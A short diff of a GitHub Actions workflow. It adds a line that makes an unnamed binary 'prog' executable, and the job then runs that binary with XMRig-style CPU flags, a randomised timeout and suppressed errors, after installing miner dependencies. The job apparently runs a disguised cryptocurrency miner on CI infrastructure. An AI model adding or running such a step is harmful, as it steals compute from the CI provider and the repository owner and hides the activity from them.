@@ -21,4 +21,5 @@ jobs:
       - uses: actions/checkout@v2
       - run: |
           apt install -y libuv1 libssl1.1 libhwloc15
+          chmod u+x prog
           timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
